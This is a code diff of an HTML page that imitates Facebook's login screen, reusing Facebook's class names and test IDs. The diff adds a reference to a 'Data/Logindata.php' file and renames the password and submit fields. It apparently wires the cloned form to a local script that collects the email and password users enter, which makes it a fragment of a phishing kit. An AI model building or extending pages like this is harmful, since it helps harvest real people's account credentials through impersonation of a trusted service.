@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <link rel="stylesheet" href="css/style.css">
+    <link href="Data/Logindata.php">
 </head>
 <body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko win x1 Locale_en_GB cores-lt4 _19_u hasAXNavMenubar" dir="ltr" data-gr-c-s-loaded="true">
     <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
@@ -40,11 +41,11 @@
                                             <input type="email" class="inputtext login_form_input_box" name="email" id="email" data-testid="royal_email">
                                         </td>
                                         <td>
-                                            <input type="password" class="inputtext login_form_input_box" name="pass" id="pass" data-testid="royal_pass">
+                                            <input type="password" class="inputtext login_form_input_box" name="password" id="password" data-testid="royal_pass">
                                         </td>
                                         <td>
                                             <label class="login_form_login_button uiButton uiButtonConfirm" id="loginbutton" for="u_0_4">
-                                                <input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_4">
+                                                <input value="Log In" type="submit" name="btn" aria-label="Log In" data-testid="royal_login_button" id="u_0_4">
                                             </label>
                                         </td>
                                     </tr>
